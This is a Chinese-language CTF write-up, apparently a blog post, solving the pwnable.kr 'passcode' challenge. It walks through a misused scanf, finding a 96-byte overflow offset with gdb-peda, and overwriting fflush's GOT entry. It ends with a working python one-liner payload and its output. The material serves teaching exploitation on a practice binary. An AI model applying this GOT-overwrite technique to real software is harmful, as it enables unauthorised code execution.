---
title: passcode
date: 2017-08-20 23:55:21
tags:
- pwn
- got
categories:
- pwnable.kr
- security
---

多种想法，运来GOT表这么覆盖！

<!-- more -->

看看程序有什么保护。可知程序开启了栈保护和
```
passcode@ubuntu:~$ checksec passcode
[*] '/home/passcode/passcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE

```


这道题的源码如下。

```
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);


        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

```

通过源码可以很容易发现，`scanf("%d", passcode1);`和`scanf("%d", passcode2);`这两个地方的参数应当传入引用，而不是原值`scanf("%d", &passcode1);`和`scanf("%d", &passcode2);`。
查看`login`的汇编代码：
```
(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
===> 0x0804857c <+24>:	mov    -0x10(%ebp),%edx 
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
===>   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>

```
这里标出来的两点分别是`passcode1`和`passcode2`，但是此处使用的`mov`， `mov    -0x10(%ebp),%edx `的做法是将在`[ebp-0x10]`地址的值传给`edx`，如果是正确的程序，这里应当是`lea    -0x10(%ebp),%edx `，这里`lea`指令为`Load Effective Address`，将地址`[ebp-0x10]`传给`edx`。
所以运行结果得到了`segmentation fault`错误。

这种做法的最大坏处就是如果`passcode1`被控制，用户可以通过`scanf("%d", passcode1);`写入任意值到内存的任意地址。

本次目的是跳入一下代码中去，可以拿到`flag`，但是`passcode1`和`passcode2`无法通过读入以下条件语句中的值。
```
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
```

那么问题来了，怎么才能让程序调到这里面呢。
通过控制`passcode1`的值，再通过`scanf("%d", passcode1);`可以在覆盖某些函数地址为`system("/bin/cat flag");`的地址，从而再次执行被篡改地址的函数时，触发攻击。
如何覆盖`passcode1`的值？栈溢出？在当前函数`login`中无法做到，但是在`welcome`中存在栈溢出的漏洞，

```
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}
```

`scanf("%100s", name);`的*%100s*意味着只存入输入值的前100个字符。这100个字符能够覆盖到`passcode1`在栈上的值呢。

这里`login`,`welcome`函数的栈基址ebp在同一位置，所以观察`welcome`中的`name`位置。

```
(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:	push   %ebp
   0x0804860a <+1>:	mov    %esp,%ebp
   0x0804860c <+3>:	sub    $0x88,%esp
   0x08048612 <+9>:	mov    %gs:0x14,%eax
   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:	xor    %eax,%eax
   0x0804861d <+20>:	mov    $0x80487cb,%eax
   0x08048622 <+25>:	mov    %eax,(%esp)
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    $0x80487dd,%eax
===>   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    $0x80487e3,%eax
   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
   0x08048646 <+61>:	mov    %edx,0x4(%esp)
   0x0804864a <+65>:	mov    %eax,(%esp)
   0x0804864d <+68>:	call   0x8048420 <printf@plt>

```
`name`的位置为`ebp-0x70`，`passcode1`和位置为`ebp-0x10`，所以两者相距为`0x60`也就是96，溢出肯定没问题。

但是我想说的是另一种确定偏移量的方法。利用`gdb-peda`的`pattern_create`和`pattern_offset`两个命令。
	
	pattern create size 生成特定长度字符串
	pattern offset value 定位字符串 

```
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ b*0x080485cc
Breakpoint 1 at 0x80485cc
gdb-peda$ r
Starting program: /home/prince/pwnable/pwnable.kr/passcode/passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
Welcome AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL!

```
将这100个字符的字符串传入程序。断点停在输入`passcode1`前。
```
[------------------------------------stack-------------------------------------]
0000| 0xffffcf30 --> 0x80487a3 --> 0x65006425 ('%d')
0004| 0xffffcf34 ("6AALAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffcf38 ("AJAAfAA5AAKAAgAA6AAL")
0012| 0xffffcf3c ("fAA5AAKAAgAA6AAL")
0016| 0xffffcf40 ("AAKAAgAA6AAL")
0020| 0xffffcf44 ("AgAA6AAL")
0024| 0xffffcf48 ("6AAL")
0028| 0xffffcf4c --> 0x1ae10600 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080485cc in login ()
gdb-peda$ x/xw $ebp-0x10
0xffffcf48:	0x4c414136
gdb-peda$ pattern_offset 0x4c414136
1279344950 found at offset: 96

```
用`pattern_offset`查看`passcode1`的值，偏移量为96。

好了，可以覆盖`passcode1`了，那么该覆盖为什么值呢？

当然是覆盖函数的地址了，覆盖函数的GOT表中的地址。GOT表中存放的函数地址是在程序运行后，动态链接器加载的函数地址。

在`system`函数前有`fflush`和`printf`两个函数可以用。

这里我选用`fflush`，有两种方法可以查看GOT表内容。
### 查看汇编代码中`fflush`函数的代码

```
(gdb) disas fflush
Dump of assembler code for function fflush@plt:
=> 0x08048430 <+0>:	jmp    *0x804a004
   0x08048436 <+6>:	push   $0x8
   0x0804843b <+11>:	jmp    0x8048410
End of assembler dump.

```

### 使用`objdump -R passcode`查看
```
passcode:     file format elf32-i386
 
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin
0804a000 R_386_JUMP_SLOT   printf
=> 0804a004 R_386_JUMP_SLOT   fflush
0804a008 R_386_JUMP_SLOT   __stack_chk_fail
0804a00c R_386_JUMP_SLOT   puts
0804a010 R_386_JUMP_SLOT   system
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit
0804a01c R_386_JUMP_SLOT   __libc_start_main
0804a020 R_386_JUMP_SLOT   __isoc99_scanf
```

查出的是`fflush`函数地址为`0x804a004`。我们将此地址中的值覆盖为我们`system`代码的地址`0x080485e3`。

```
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>

```
由于是整数输入，我们要将`0x080485e3`表示为10进制的134514147。

所以，构造的payload为
```
python -c 'print "A"*96 +"\x04\xa0\x04\x08" + "134514147"  ' | ./passcode 
```
得到flag。pwn!

```
passcode@ubuntu:~$ python -c 'print "A"*96 +"\x04\xa0\x04\x08" + "134514147"  ' | ./passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)

```





# 参考文献
[1] [[Pwnable.kr] passcode writeup – Toddler’s bottle](https://www.nrjfl0w.org/index.php/2016/09/04/passcode-writeup-pwnable/)
[2] [pwn学习笔记汇总（持续更新）](https://etenal.me/archives/972#C6)
[3] [一些pwn题目的解题思路[pwnable.kr](http://weaponx.site/2017/02/13/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr/)
[4] [PEDA用法总结](http://blog.csdn.net/SmalOSnail/article/details/53149426)
